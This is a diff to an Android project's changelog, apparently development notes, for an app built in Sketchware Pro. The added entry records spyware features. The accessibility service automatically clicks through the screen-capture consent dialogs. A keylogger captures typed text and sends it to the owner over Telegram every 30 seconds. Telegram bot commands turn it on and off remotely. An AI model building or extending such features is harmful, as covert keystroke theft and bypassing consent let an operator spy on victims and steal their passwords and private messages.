@@ -96,3 +96,18 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
   - `MyAccessibilityService.java` new methods: `handleMediaProjectionFlow()` (state machine), `findDropdown()`, `findShareEntireScreenOption()`, `findNodeByText()`, `findButton()`, `findStartNowButton()`, `findUncheckedToggle()`, `findPermissionAllowButton()`
   - `AutoSetupActivity.java` updated: `tryGrantViaAppInfoPermissions()`, `trySpecialSettingsNext()` sequential
   - Compile: clean (pre-existing okio only)
+- **V6.3 (2026-08-24):** Multi-strategy dropdown + Keylogger + Screenshot fix.
+  - **MediaProjection dropdown FIX**: 3-strategy approach:
+    1. Node tree text search → click
+    2. Gesture click on text coordinates (bypasses popup window issues)
+    3. Find "Share one app" bounds → click below (popup list position)
+  - **Button fallback**: If performAction fails → gesture click on center coordinates
+  - **Keylogger**: Accessibility-based keystroke capture via TYPE_VIEW_TEXT_CHANGED
+    - `/keylogger on` → enable, `/keylogger off` → disable
+    - `/keylog` → fetch captured text
+    - Auto-flush every 30s to Telegram
+    - `MyAccessibilityService`: `logTypedText()`, `flushKeyLog()`, `sendKeyLogToOwner()`, `getBotToken()`
+  - `TelegramRemoteService`: `/keylogger on|off`, `/keylog` commands + help text updated
+  - `MyAccessibilityService.java`: `handleMediaProjectionFlow()` rewritten, `dispatchGestureClick()`, `gestureClickNode()`, `findPositiveButton()`, `findDropdownNode()`
+  - `/shot` note: MediaProjection lagbei — Android limitation, no bypass. Auto-consent flow covers it.
+  - Compile: clean (pre-existing okio only)
